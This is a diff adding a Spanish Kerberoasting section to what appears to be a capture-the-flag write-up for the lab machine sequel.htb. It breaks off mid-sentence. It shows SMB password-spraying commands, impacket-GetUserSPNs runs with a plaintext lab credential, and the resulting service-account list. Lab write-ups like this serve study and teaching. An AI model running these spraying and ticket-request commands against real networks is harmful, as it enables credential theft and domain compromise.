@@ -86,3 +86,27 @@ nxc smb 10.129.232.128 -u users.txt -p 'KxEPkKe6R8su'
 nxc smb 10.129.232.128 -u users.txt -p users.txt --no-bruteforce
 ```
 
+
+## Kerberoasting
+
+Enumerar usuarios kerberoasteables
+```shell
+impacket-GetUserSPNs 'sequel.htb/rose:KxEPkKe6R8su'
+```
+
+Encontramos dos usuarios
+```shell
+
+ServicePrincipalName     Name     MemberOf                                            
+-----------------------  -------  ----------------------------------------------------
+sequel.htb/sql_svc.DC01  sql_svc  CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,DC=htb
+sequel.htb/ca_svc.DC01   ca_svc   CN=Cert Publishers,CN=Users,DC=sequel,DC=htb        
+```
+
+Solicitar los tickets de estsos usuarios
+```shell
+impacket-GetUserSPNs 'sequel.htb/rose:KxEPkKe6R8su' -request
+```
+
+Nos lo guardamos en un fichero llamado `hash`
+Los c
